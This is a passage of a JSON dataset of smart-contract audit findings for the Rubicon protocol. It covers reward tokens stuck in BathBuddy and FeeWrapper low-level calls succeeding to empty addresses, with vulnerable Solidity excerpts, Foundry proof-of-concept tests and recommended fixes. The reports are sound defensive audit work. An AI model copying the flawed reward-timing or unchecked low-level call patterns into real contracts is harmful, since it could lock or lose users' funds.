bathBuddy.setRewardsDuration(duration, address(rewardToken));\n\n    uint256 rewardAmount = 100 ether;\n    rewardToken.mint(address(bathBuddy), rewardAmount);\n    vm.prank(bathBuddyOwner);\n    bathBuddy.notifyRewardAmount(rewardAmount, rewardToken);\n\n    // Simulate half of the duration time passes\n    vm.warp(startTime + duration / 2);\n\n    // Trigger updateRewards to update state\n    vm.prank(bathBuddyHouse);\n    bathBuddy.getReward(rewardToken, address(0));\n\n    // Mint bathTokens to Alice\n    uint256 bathTokenAmount = 1 ether;\n    bathToken.mint(alice, bathTokenAmount);\n\n    // Simulate complete duration time passes\n    vm.warp(startTime + duration);\n\n    // Trigger getRewards for Alice\n    vm.prank(bathBuddyHouse);\n    bathBuddy.getReward(rewardToken, alice);\n\n    // Alice will only get half of the rewards. The other half will be stuck in the contract.\n    assertEq(rewardToken.balanceOf(alice), rewardAmount / 2);\n    assertEq(rewardToken.balanceOf(address(bathBuddy)), rewardAmount / 2);\n}\n```\n\n## Recommendation\n\nA possible solution to the issue would be to set the start and end time for the current reward cycle when the first participant joins the reward program, i.e. when the total supply is greater than zero, instead of starting the process in the `notifyRewardAmount`.\n\n## References\n\nThe following reports can be used as a reference for the described issue:\n\n- https://0xmacro.com/blog/synthetix-staking-rewards-issue-inefficient-reward-distribution/\n- https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/93\n",
      "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/periphery/BathBuddy.sol#L191-L228\n\n\n# Vulnerability details\n\n## Impact\n\nRewards in the BathBuddy contract are initiated when the owner calls the `notifyRewardAmount`. This function calculates the reward rate per second (lines 196-198 and 207-208) and also records the start of the reward period (line 223):\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/periphery/BathBuddy.sol#L191-L228\n\n```solidity\n191:     function notifyRewardAmount(\n192:         uint256 reward,\n193:         IERC20 rewardsToken\n194:     ) external onlyOwner updateReward(address(0), address(rewardsToken)) {\n195:         if (block.timestamp >= periodFinish[address(rewardsToken)]) {\n196:             rewardRates[address(rewardsToken)] = reward.div(\n197:                 rewardsDuration[address(rewardsToken)]\n198:             );\n199:         } else {\n200:             uint256 remaining = periodFinish[address(rewardsToken)].sub(\n201:                 block.timestamp\n202:             );\n203:             uint256 leftover = remaining.mul(\n204:                 rewardRates[address(rewardsToken)]\n205:             );\n206:             rewardRates[address(rewardsToken)] = reward.add(leftover).div(\n207:                 rewardsDuration[address(rewardsToken)]\n208:             );\n209:         }\n210: \n211:         // Ensure the provided reward amount is not more than the balance in the contract.\n212:         // This keeps the reward rate in the right range, preventing overflows due to\n213:         // very high values of rewardRate in the earned and rewardsPerToken functions;\n214:         // Reward + leftover must be less than 2^256 / 10^18 to avoid overflow.\n215:         // Note********** ERC20s must be here*************\n216:         uint256 balance = rewardsToken.balanceOf(address(this));\n217:         require(\n218:             rewardRates[address(rewardsToken)] <=\n219:                 balance.div(rewardsDuration[address(rewardsToken)]),\n220:             \"Provided reward too high\"\n221:         );\n222: \n223:         lastUpdateTime[address(rewardsToken)] = block.timestamp;\n224:         periodFinish[address(rewardsToken)] = block.timestamp.add(\n225:             rewardsDuration[address(rewardsToken)]\n226:         );\n227:         emit RewardAdded(reward);\n228:     }\n```\n\nThe intention here is to calculate how many tokens should be rewarded by unit of time (second) and record the span of time for the reward cycle. However, this has an edge case where rewards are not counted for the initial period of time until there is at least one participant (in this case, a holder of BathTokens). During this initial period of time, the reward rate will still apply but as there isn't any participant, then no one will be able to claim these rewards. See PoC for a detailed example of the issue.\n\n## Proof of Concept\n\nIn the following test, we initiate the reward process by calling `notifyRewardAmount`. At the middle of the duration process, we mint BathTokens to Alice to represent her participant. At the end of the duration process, after Alice claims her rewards, half of them will still be held in the `BathBuddy` contract.\n\nNote: the snippet shows only the relevant code for the test. Full test file can be found [here](https://gist.github.com/romeroadrian/f3b7d6f9ab043340de7deb67a9c515e5).\n\n```solidity\nfunction test_BathBuddy_RewardsLostForInitialPeriod() public {\n    // Setup rewards\n    uint256 startTime = block.timestamp;\n    uint256 duration = 10_000 seconds;\n    vm.prank(bathBuddyOwner);\n    bathBuddy.setRewardsDuration(duration, address(rewardToken));\n\n    uint256 rewardAmount = 100 ether;\n    rewardToken.mint(address(bathBuddy), rewardAmount);\n    vm.prank(bathBuddyOwner);\n    bathBuddy.notifyRewardAmount(rewardAmount, rewardToken);\n\n    // Simulate half of the duration time passes\n    vm.warp(startTime + duration / 2);\n\n    // Trigger updateRewards to update state\n    vm.prank(bathBuddyHouse);\n    bathBuddy.getReward(rewardToken, address(0));\n\n    // Mint bathTokens to Alice\n    uint256 bathTokenAmount = 1 ether;\n    bathToken.mint(alice, bathTokenAmount);\n\n    // Simulate complete duration time passes\n    vm.warp(startTime + duration);\n\n    // Trigger getRewards for Alice\n    vm.prank(bathBuddyHouse);\n    bathBuddy.getReward(rewardToken, alice);\n\n    // Alice will only get half of the rewards. The other half will be stuck in the contract.\n    assertEq(rewardToken.balanceOf(alice), rewardAmount / 2);\n    assertEq(rewardToken.balanceOf(address(bathBuddy)), rewardAmount / 2);\n}\n```\n\n## Recommendation\n\nA possible solution to the issue would be to set the start and end time for the current reward cycle when the first participant joins the reward program, i.e. when the total supply is greater than zero, instead of starting the process in the `notifyRewardAmount`.\n\n## References\n\nThe following reports can be used as a reference for the described issue:\n\n- https://0xmacro.com/blog/synthetix-staking-rewards-issue-inefficient-reward-distribution/\n- https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/93\n",
      "description": null,
      "impact": "## Impact\n\nRewards in the BathBuddy contract are initiated when the owner calls the `notifyRewardAmount`. This function calculates the reward rate per second (lines 196-198 and 207-208) and also records the start of the reward period (line 223):\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/periphery/BathBuddy.sol#L191-L228\n\n```solidity\n191:     function notifyRewardAmount(\n192:         uint256 reward,\n193:         IERC20 rewardsToken\n194:     ) external onlyOwner updateReward(address(0), address(rewardsToken)) {\n195:         if (block.timestamp >= periodFinish[address(rewardsToken)]) {\n196:             rewardRates[address(rewardsToken)] = reward.div(\n197:                 rewardsDuration[address(rewardsToken)]\n198:             );\n199:         } else {\n200:             uint256 remaining = periodFinish[address(rewardsToken)].sub(\n201:                 block.timestamp\n202:             );\n203:             uint256 leftover = remaining.mul(\n204:                 rewardRates[address(rewardsToken)]\n205:             );\n206:             rewardRates[address(rewardsToken)] = reward.add(leftover).div(\n207:                 rewardsDuration[address(rewardsToken)]\n208:             );\n209:         }\n210:\n211:         // Ensure the provided reward amount is not more than the balance in the contract.\n212:         // This keeps the reward rate in the right range, preventing overflows due to\n213:         // very high values of rewardRate in the earned and rewardsPerToken functions;\n214:         // Reward + leftover must be less than 2^256 / 10^18 to avoid overflow.\n215:         // Note********** ERC20s must be here*************\n216:         uint256 balance = rewardsToken.balanceOf(address(this));\n217:         require(\n218:             rewardRates[address(rewardsToken)] <=\n219:                 balance.div(rewardsDuration[address(rewardsToken)]),\n220:             \"Provided reward too high\"\n221:         );\n222:\n223:         lastUpdateTime[address(rewardsToken)] = block.timestamp;\n224:         periodFinish[address(rewardsToken)] = block.timestamp.add(\n225:             rewardsDuration[address(rewardsToken)]\n226:         );\n227:         emit RewardAdded(reward);\n228:     }\n```\n\nThe intention here is to calculate how many tokens should be rewarded by unit of time (second) and record the span of time for the reward cycle. However, this has an edge case where rewards are not counted for the initial period of time until there is at least one participant (in this case, a holder of BathTokens). During this initial period of time, the reward rate will still apply but as there isn't any participant, then no one will be able to claim these rewards. See PoC for a detailed example of the issue.\n",
      "mitigation": "## Recommendation\n\nA possible solution to the issue would be to set the start and end time for the current reward cycle when the first participant joins the reward program, i.e. when the total supply is greater than zero, instead of starting the process in the `notifyRewardAmount`.\n\n## References\n\nThe following reports can be used as a reference for the described issue:\n\n- https://0xmacro.com/blog/synthetix-staking-rewards-issue-inefficient-reward-distribution/\n- https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/93\n",
      "poc": "## Proof of Concept\n\nIn the following test, we initiate the reward process by calling `notifyRewardAmount`. At the middle of the duration process, we mint BathTokens to Alice to represent her participant. At the end of the duration process, after Alice claims her rewards, half of them will still be held in the `BathBuddy` contract.\n\nNote: the snippet shows only the relevant code for the test. Full test file can be found [here](https://gist.github.com/romeroadrian/f3b7d6f9ab043340de7deb67a9c515e5).\n\n```solidity\nfunction test_BathBuddy_RewardsLostForInitialPeriod() public {\n    // Setup rewards\n    uint256 startTime = block.timestamp;\n    uint256 duration = 10_000 seconds;\n    vm.prank(bathBuddyOwner);\n    bathBuddy.setRewardsDuration(duration, address(rewardToken));\n\n    uint256 rewardAmount = 100 ether;\n    rewardToken.mint(address(bathBuddy), rewardAmount);\n    vm.prank(bathBuddyOwner);\n    bathBuddy.notifyRewardAmount(rewardAmount, rewardToken);\n\n    // Simulate half of the duration time passes\n    vm.warp(startTime + duration / 2);\n\n    // Trigger updateRewards to update state\n    vm.prank(bathBuddyHouse);\n    bathBuddy.getReward(rewardToken, address(0));\n\n    // Mint bathTokens to Alice\n    uint256 bathTokenAmount = 1 ether;\n    bathToken.mint(alice, bathTokenAmount);\n\n    // Simulate complete duration time passes\n    vm.warp(startTime + duration);\n\n    // Trigger getRewards for Alice\n    vm.prank(bathBuddyHouse);\n    bathBuddy.getReward(rewardToken, alice);\n\n    // Alice will only get half of the rewards. The other half will be stuck in the contract.\n    assertEq(rewardToken.balanceOf(alice), rewardAmount / 2);\n    assertEq(rewardToken.balanceOf(address(bathBuddy)), rewardAmount / 2);\n}\n```\n",
      "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/periphery/BathBuddy.sol#L191-L228\n\n**container:**\n# Vulnerability details\n",
      "sections": {
        "description": null,
        "impact": "## Impact\n\nRewards in the BathBuddy contract are initiated when the owner calls the `notifyRewardAmount`. This function calculates the reward rate per second (lines 196-198 and 207-208) and also records the start of the reward period (line 223):\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/periphery/BathBuddy.sol#L191-L228\n\n```solidity\n191:     function notifyRewardAmount(\n192:         uint256 reward,\n193:         IERC20 rewardsToken\n194:     ) external onlyOwner updateReward(address(0), address(rewardsToken)) {\n195:         if (block.timestamp >= periodFinish[address(rewardsToken)]) {\n196:             rewardRates[address(rewardsToken)] = reward.div(\n197:                 rewardsDuration[address(rewardsToken)]\n198:             );\n199:         } else {\n200:             uint256 remaining = periodFinish[address(rewardsToken)].sub(\n201:                 block.timestamp\n202:             );\n203:             uint256 leftover = remaining.mul(\n204:                 rewardRates[address(rewardsToken)]\n205:             );\n206:             rewardRates[address(rewardsToken)] = reward.add(leftover).div(\n207:                 rewardsDuration[address(rewardsToken)]\n208:             );\n209:         }\n210:\n211:         // Ensure the provided reward amount is not more than the balance in the contract.\n212:         // This keeps the reward rate in the right range, preventing overflows due to\n213:         // very high values of rewardRate in the earned and rewardsPerToken functions;\n214:         // Reward + leftover must be less than 2^256 / 10^18 to avoid overflow.\n215:         // Note********** ERC20s must be here*************\n216:         uint256 balance = rewardsToken.balanceOf(address(this));\n217:         require(\n218:             rewardRates[address(rewardsToken)] <=\n219:                 balance.div(rewardsDuration[address(rewardsToken)]),\n220:             \"Provided reward too high\"\n221:         );\n222:\n223:         lastUpdateTime[address(rewardsToken)] = block.timestamp;\n224:         periodFinish[address(rewardsToken)] = block.timestamp.add(\n225:             rewardsDuration[address(rewardsToken)]\n226:         );\n227:         emit RewardAdded(reward);\n228:     }\n```\n\nThe intention here is to calculate how many tokens should be rewarded by unit of time (second) and record the span of time for the reward cycle. However, this has an edge case where rewards are not counted for the initial period of time until there is at least one participant (in this case, a holder of BathTokens). During this initial period of time, the reward rate will still apply but as there isn't any participant, then no one will be able to claim these rewards. See PoC for a detailed example of the issue.\n",
        "recommendation": "## Recommendation\n\nA possible solution to the issue would be to set the start and end time for the current reward cycle when the first participant joins the reward program, i.e. when the total supply is greater than zero, instead of starting the process in the `notifyRewardAmount`.\n\n## References\n\nThe following reports can be used as a reference for the described issue:\n\n- https://0xmacro.com/blog/synthetix-staking-rewards-issue-inefficient-reward-distribution/\n- https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/93\n",
        "poc": "## Proof of Concept\n\nIn the following test, we initiate the reward process by calling `notifyRewardAmount`. At the middle of the duration process, we mint BathTokens to Alice to represent her participant. At the end of the duration process, after Alice claims her rewards, half of them will still be held in the `BathBuddy` contract.\n\nNote: the snippet shows only the relevant code for the test. Full test file can be found [here](https://gist.github.com/romeroadrian/f3b7d6f9ab043340de7deb67a9c515e5).\n\n```solidity\nfunction test_BathBuddy_RewardsLostForInitialPeriod() public {\n    // Setup rewards\n    uint256 startTime = block.timestamp;\n    uint256 duration = 10_000 seconds;\n    vm.prank(bathBuddyOwner);\n    bathBuddy.setRewardsDuration(duration, address(rewardToken));\n\n    uint256 rewardAmount = 100 ether;\n    rewardToken.mint(address(bathBuddy), rewardAmount);\n    vm.prank(bathBuddyOwner);\n    bathBuddy.notifyRewardAmount(rewardAmount, rewardToken);\n\n    // Simulate half of the duration time passes\n    vm.warp(startTime + duration / 2);\n\n    // Trigger updateRewards to update state\n    vm.prank(bathBuddyHouse);\n    bathBuddy.getReward(rewardToken, address(0));\n\n    // Mint bathTokens to Alice\n    uint256 bathTokenAmount = 1 ether;\n    bathToken.mint(alice, bathTokenAmount);\n\n    // Simulate complete duration time passes\n    vm.warp(startTime + duration);\n\n    // Trigger getRewards for Alice\n    vm.prank(bathBuddyHouse);\n    bathBuddy.getReward(rewardToken, alice);\n\n    // Alice will only get half of the rewards. The other half will be stuck in the contract.\n    assertEq(rewardToken.balanceOf(alice), rewardAmount / 2);\n    assertEq(rewardToken.balanceOf(address(bathBuddy)), rewardAmount / 2);\n}\n```\n",
        "fix_status": null,
        "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/periphery/BathBuddy.sol#L191-L228\n\n**container:**\n# Vulnerability details\n"
      },
      "markdown_body": "https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/periphery/BathBuddy.sol#L191-L228\n\n\n# Vulnerability details\n\n## Impact\n\nRewards in the BathBuddy contract are initiated when the owner calls the `notifyRewardAmount`. This function calculates the reward rate per second (lines 196-198 and 207-208) and also records the start of the reward period (line 223):\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/periphery/BathBuddy.sol#L191-L228\n\n```solidity\n191:     function notifyRewardAmount(\n192:         uint256 reward,\n193:         IERC20 rewardsToken\n194:     ) external onlyOwner updateReward(address(0), address(rewardsToken)) {\n195:         if (block.timestamp >= periodFinish[address(rewardsToken)]) {\n196:             rewardRates[address(rewardsToken)] = reward.div(\n197:                 rewardsDuration[address(rewardsToken)]\n198:             );\n199:         } else {\n200:             uint256 remaining = periodFinish[address(rewardsToken)].sub(\n201:                 block.timestamp\n202:             );\n203:             uint256 leftover = remaining.mul(\n204:                 rewardRates[address(rewardsToken)]\n205:             );\n206:             rewardRates[address(rewardsToken)] = reward.add(leftover).div(\n207:                 rewardsDuration[address(rewardsToken)]\n208:             );\n209:         }\n210:\n211:         // Ensure the provided reward amount is not more than the balance in the contract.\n212:         // This keeps the reward rate in the right range, preventing overflows due to\n213:         // very high values of rewardRate in the earned and rewardsPerToken functions;\n214:         // Reward + leftover must be less than 2^256 / 10^18 to avoid overflow.\n215:         // Note********** ERC20s must be here*************\n216:         uint256 balance = rewardsToken.balanceOf(address(this));\n217:         require(\n218:             rewardRates[address(rewardsToken)] <=\n219:                 balance.div(rewardsDuration[address(rewardsToken)]),\n220:             \"Provided reward too high\"\n221:         );\n222:\n223:         lastUpdateTime[address(rewardsToken)] = block.timestamp;\n224:         periodFinish[address(rewardsToken)] = block.timestamp.add(\n225:             rewardsDuration[address(rewardsToken)]\n226:         );\n227:         emit RewardAdded(reward);\n228:     }\n```\n\nThe intention here is to calculate how many tokens should be rewarded by unit of time (second) and record the span of time for the reward cycle. However, this has an edge case where rewards are not counted for the initial period of time until there is at least one participant (in this case, a holder of BathTokens). During this initial period of time, the reward rate will still apply but as there isn't any participant, then no one will be able to claim these rewards. See PoC for a detailed example of the issue.\n\n## Proof of Concept\n\nIn the following test, we initiate the reward process by calling `notifyRewardAmount`. At the middle of the duration process, we mint BathTokens to Alice to represent her participant. At the end of the duration process, after Alice claims her rewards, half of them will still be held in the `BathBuddy` contract.\n\nNote: the snippet shows only the relevant code for the test. Full test file can be found [here](https://gist.github.com/romeroadrian/f3b7d6f9ab043340de7deb67a9c515e5).\n\n```solidity\nfunction test_BathBuddy_RewardsLostForInitialPeriod() public {\n    // Setup rewards\n    uint256 startTime = block.timestamp;\n    uint256 duration = 10_000 seconds;\n    vm.prank(bathBuddyOwner);\n    bathBuddy.setRewardsDuration(duration, address(rewardToken));\n\n    uint256 rewardAmount = 100 ether;\n    rewardToken.mint(address(bathBuddy), rewardAmount);\n    vm.prank(bathBuddyOwner);\n    bathBuddy.notifyRewardAmount(rewardAmount, rewardToken);\n\n    // Simulate half of the duration time passes\n    vm.warp(startTime + duration / 2);\n\n    // Trigger updateRewards to update state\n    vm.prank(bathBuddyHouse);\n    bathBuddy.getReward(rewardToken, address(0));\n\n    // Mint bathTokens to Alice\n    uint256 bathTokenAmount = 1 ether;\n    bathToken.mint(alice, bathTokenAmount);\n\n    // Simulate complete duration time passes\n    vm.warp(startTime + duration);\n\n    // Trigger getRewards for Alice\n    vm.prank(bathBuddyHouse);\n    bathBuddy.getReward(rewardToken, alice);\n\n    // Alice will only get half of the rewards. The other half will be stuck in the contract.\n    assertEq(rewardToken.balanceOf(alice), rewardAmount / 2);\n    assertEq(rewardToken.balanceOf(address(bathBuddy)), rewardAmount / 2);\n}\n```\n\n## Recommendation\n\nA possible solution to the issue would be to set the start and end time for the current reward cycle when the first participant joins the reward program, i.e. when the total supply is greater than zero, instead of starting the process in the `notifyRewardAmount`.\n\n## References\n\nThe following reports can be used as a reference for the described issue:\n\n- https://0xmacro.com/blog/synthetix-staking-rewards-issue-inefficient-reward-distribution/\n- https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/93\n",
      "metadata": {
        "Severity": "Medium",
        "Difficulty": null,
        "Type": "bug",
        "Finding ID": null,
        "Target": null
      }
    },
    {
      "index": 1298,
      "page_start": null,
      "heading": "1298. Low level calls to accounts with no code will succeed in `FeeWrapper`",
      "heading_cleaned": "Low level calls to accounts with no code will succeed in `FeeWrapper`",
      "markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L60-L73\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L76-L89\n\n\n# Vulnerability details\n\n## Impact\n\nThe FeeWrapper contract wraps calls to an arbitrary target contract to add support for fees. The implementation executes a low level call to proxy the call to the target contract. This can be seen in the `_rubicall` and `_rubicallPayable` functions:\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L60-L73\n\n```solidity\n60:     function _rubicall(\n61:         CallParams memory _params\n62:     ) internal returns (bytes memory) {\n63:         // charge fee from feeParams\n64:         _chargeFee(_params.feeParams, _params.target);\n65:\n66:         (bool _OK, bytes memory _data) = _params.target.call(\n67:             bytes.concat(_params.selector, _params.args)\n68:         );\n69:\n70:         require(_OK, \"low-level call to the Rubicon failed\");\n71:\n72:         return _data;\n73:     }\n```\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L76-L89\n\n```solidity\n76:     function _rubicallPayable(\n77:         CallParams memory _params\n78:     ) internal returns (bytes memory) {\n79:         // charge fee from feeParams\n80:         uint256 _msgValue = _chargeFeePayable(_params.feeParams);\n81:\n82:         (bool _OK, bytes memory _data) = _params.target.call{value: _msgValue}(\n83:             bytes.concat(_params.selector, _params.args)\n84:         );\n85:\n86:         require(_OK, \"low-level call to the router failed\");\n87:\n88:         return _data;\n89:     }\n```\n\nLow level calls behave differently than function calls in Solidity. Calls at the EVM level to accounts with no code are successful, this is the expected and normal behavior. It is Solidity that adds checks to prevent accidental calls to accounts with no code while compiling code for normal function calls.\n\nThis means that if the target account has no code, then the wrapped call using the FeeWrapper contract will succeed and the operation will be executed successfully. An accidental mistake may go unnoticed and may also cause unexpected loss of funds, as this call may include call value for transferring ETH.\n\n## Proof of Concept\n\nIn the following test, we use the FeeWrapper contract to execute a call to an account with no code. The transaction will succeed and the ETH will be transferred to the target account.\n\nNote: the snippet shows only the relevant code for the test. Full test file can be found [here](https://gist.github.com/romeroadrian/f3b7d6f9ab043340de7deb67a9c515e5).\n\n```solidity\nfunction test_FeeWrapper_CallsToAccountsNoCodeSucceed() public {\n    FeeWrapper.CallParams memory callParams;\n    callParams.selector = bytes4(0x01020304);\n    callParams.args = abi.encode(uint256(42));\n    callParams.target = makeAddr(\"address with no code\");\n    callParams.feeParams.totalAmount = 0.1 ether;\n    callParams.feeParams.feeAmount = 0.01 ether;\n    callParams.feeParams.feeTo = makeAddr(\"FeeRecipient\");\n\n    // Target has no code\n    assertEq(callParams.target.code.length, 0);\n\n    // Call succeeds even though the target has no code and no implementation\n    feeWrapper.rubicall{value: 0.1 ether}(callParams);\n}\n```\n\n## Recommendation\n\nWhile executing low level calls, the `_rubicall` and `_rubicallPayable` functions should check that either the account has code or the return data is greater than zero (which indicates the presence of an implementation). The OpenZeppelin contracts library provides utilities to execute low level calls in a safe way, including the recommended checks, present in the Address library, [functionCall](https://docs.openzeppelin.com/contracts/4.x/api/utils#Address-functionCall-address-bytes-) and [functionCallWithValue](https://docs.openzeppelin.com/contracts/4.x/api/utils#Address-functionCallWithValue-address-bytes-uint256-).\n",
      "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L60-L73\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L76-L89\n\n\n# Vulnerability details\n\n## Impact\n\nThe FeeWrapper contract wraps calls to an arbitrary target contract to add support for fees. The implementation executes a low level call to proxy the call to the target contract. This can be seen in the `_rubicall` and `_rubicallPayable` functions:\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L60-L73\n\n```solidity\n60:     function _rubicall(\n61:         CallParams memory _params\n62:     ) internal returns (bytes memory) {\n63:         // charge fee from feeParams\n64:         _chargeFee(_params.feeParams, _params.target);\n65: \n66:         (bool _OK, bytes memory _data) = _params.target.call(\n67:             bytes.concat(_params.selector, _params.args)\n68:         );\n69: \n70:         require(_OK, \"low-level call to the Rubicon failed\");\n71: \n72:         return _data;\n73:     }\n```\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L76-L89\n\n```solidity\n76:     function _rubicallPayable(\n77:         CallParams memory _params\n78:     ) internal returns (bytes memory) {\n79:         // charge fee from feeParams\n80:         uint256 _msgValue = _chargeFeePayable(_params.feeParams);\n81: \n82:         (bool _OK, bytes memory _data) = _params.target.call{value: _msgValue}(\n83:             bytes.concat(_params.selector, _params.args)\n84:         );\n85: \n86:         require(_OK, \"low-level call to the router failed\");\n87: \n88:         return _data;\n89:     }\n```\n\nLow level calls behave differently than function calls in Solidity. Calls at the EVM level to accounts with no code are successful, this is the expected and normal behavior. It is Solidity that adds checks to prevent accidental calls to accounts with no code while compiling code for normal function calls. \n\nThis means that if the target account has no code, then the wrapped call using the FeeWrapper contract will succeed and the operation will be executed successfully. An accidental mistake may go unnoticed and may also cause unexpected loss of funds, as this call may include call value for transferring ETH.\n\n## Proof of Concept\n\nIn the following test, we use the FeeWrapper contract to execute a call to an account with no code. The transaction will succeed and the ETH will be transferred to the target account.\n\nNote: the snippet shows only the relevant code for the test. Full test file can be found [here](https://gist.github.com/romeroadrian/f3b7d6f9ab043340de7deb67a9c515e5). \n\n```solidity\nfunction test_FeeWrapper_CallsToAccountsNoCodeSucceed() public {\n    FeeWrapper.CallParams memory callParams;\n    callParams.selector = bytes4(0x01020304);\n    callParams.args = abi.encode(uint256(42));\n    callParams.target = makeAddr(\"address with no code\");\n    callParams.feeParams.totalAmount = 0.1 ether;\n    callParams.feeParams.feeAmount = 0.01 ether;\n    callParams.feeParams.feeTo = makeAddr(\"FeeRecipient\");\n\n    // Target has no code\n    assertEq(callParams.target.code.length, 0);\n\n    // Call succeeds even though the target has no code and no implementation\n    feeWrapper.rubicall{value: 0.1 ether}(callParams);\n}\n```\n\n## Recommendation\n\nWhile executing low level calls, the `_rubicall` and `_rubicallPayable` functions should check that either the account has code or the return data is greater than zero (which indicates the presence of an implementation). The OpenZeppelin contracts library provides utilities to execute low level calls in a safe way, including the recommended checks, present in the Address library, [functionCall](https://docs.openzeppelin.com/contracts/4.x/api/utils#Address-functionCall-address-bytes-) and [functionCallWithValue](https://docs.openzeppelin.com/contracts/4.x/api/utils#Address-functionCallWithValue-address-bytes-uint256-).\n",
      "description": null,
      "impact": "## Impact\n\nThe FeeWrapper contract wraps calls to an arbitrary target contract to add support for fees. The implementation executes a low level call to proxy the call to the target contract. This can be seen in the `_rubicall` and `_rubicallPayable` functions:\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L60-L73\n\n```solidity\n60:     function _rubicall(\n61:         CallParams memory _params\n62:     ) internal returns (bytes memory) {\n63:         // charge fee from feeParams\n64:         _chargeFee(_params.feeParams, _params.target);\n65:\n66:         (bool _OK, bytes memory _data) = _params.target.call(\n67:             bytes.concat(_params.selector, _params.args)\n68:         );\n69:\n70:         require(_OK, \"low-level call to the Rubicon failed\");\n71:\n72:         return _data;\n73:     }\n```\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L76-L89\n\n```solidity\n76:     function _rubicallPayable(\n77:         CallParams memory _params\n78:     ) internal returns (bytes memory) {\n79:         // charge fee from feeParams\n80:         uint256 _msgValue = _chargeFeePayable(_params.feeParams);\n81:\n82:         (bool _OK, bytes memory _data) = _params.target.call{value: _msgValue}(\n83:             bytes.concat(_params.selector, _params.args)\n84:         );\n85:\n86:         require(_OK, \"low-level call to the router failed\");\n87:\n88:         return _data;\n89:     }\n```\n\nLow level calls behave differently than function calls in Solidity. Calls at the EVM level to accounts with no code are successful, this is the expected and normal behavior. It is Solidity that adds checks to prevent accidental calls to accounts with no code while compiling code for normal function calls.\n\nThis means that if the target account has no code, then the wrapped call using the FeeWrapper contract will succeed and the operation will be executed successfully. An accidental mistake may go unnoticed and may also cause unexpected loss of funds, as this call may include call value for transferring ETH.\n",
      "mitigation": "## Recommendation\n\nWhile executing low level calls, the `_rubicall` and `_rubicallPayable` functions should check that either the account has code or the return data is greater than zero (which indicates the presence of an implementation). The OpenZeppelin contracts library provides utilities to execute low level calls in a safe way, including the recommended checks, present in the Address library, [functionCall](https://docs.openzeppelin.com/contracts/4.x/api/utils#Address-functionCall-address-bytes-) and [functionCallWithValue](https://docs.openzeppelin.com/contracts/4.x/api/utils#Address-functionCallWithValue-address-bytes-uint256-).\n",
      "poc": "## Proof of Concept\n\nIn the following test, we use the FeeWrapper contract to execute a call to an account with no code. The transaction will succeed and the ETH will be transferred to the target account.\n\nNote: the snippet shows only the relevant code for the test. Full test file can be found [here](https://gist.github.com/romeroadrian/f3b7d6f9ab043340de7deb67a9c515e5).\n\n```solidity\nfunction test_FeeWrapper_CallsToAccountsNoCodeSucceed() public {\n    FeeWrapper.CallParams memory callParams;\n    callParams.selector = bytes4(0x01020304);\n    callParams.args = abi.encode(uint256(42));\n    callParams.target = makeAddr(\"address with no code\");\n    callParams.feeParams.totalAmount = 0.1 ether;\n    callParams.feeParams.feeAmount = 0.01 ether;\n    callParams.feeParams.feeTo = makeAddr(\"FeeRecipient\");\n\n    // Target has no code\n    assertEq(callParams.target.code.length, 0);\n\n    // Call succeeds even though the target has no code and no implementation\n    feeWrapper.rubicall{value: 0.1 ether}(callParams);\n}\n```\n",
      "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L60-L73\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L76-L89\n\n**container:**\n# Vulnerability details\n",
      "sections": {
        "description": null,
        "impact": "## Impact\n\nThe FeeWrapper contract wraps calls to an arbitrary target contract to add support for fees. The implementation executes a low level call to proxy the call to the target contract. This can be seen in the `_rubicall` and `_rubicallPayable` functions:\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L60-L73\n\n```solidity\n60:     function _rubicall(\n61:         CallParams memory _params\n62:     ) internal returns (bytes memory) {\n63:         // charge fee from feeParams\n64:         _chargeFee(_params.feeParams, _params.target);\n65:\n66:         (bool _OK, bytes memory _data) = _params.target.call(\n67:             bytes.concat(_params.selector, _params.args)\n68:         );\n69:\n70:         require(_OK, \"low-level call to the Rubicon failed\");\n71:\n72:         return _data;\n73:     }\n```\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L76-L89\n\n```solidity\n76:     function _rubicallPayable(\n77:         CallParams memory _params\n78:     ) internal returns (bytes memory) {\n79:         // charge fee from feeParams\n80:         uint256 _msgValue = _chargeFeePayable(_params.feeParams);\n81:\n82:         (bool _OK, bytes memory _data) = _params.target.call{value: _msgValue}(\n83:             bytes.concat(_params.selector, _params.args)\n84:         );\n85:\n86:         require(_OK, \"low-level call to the router failed\");\n87:\n88:         return _data;\n89:     }\n```\n\nLow level 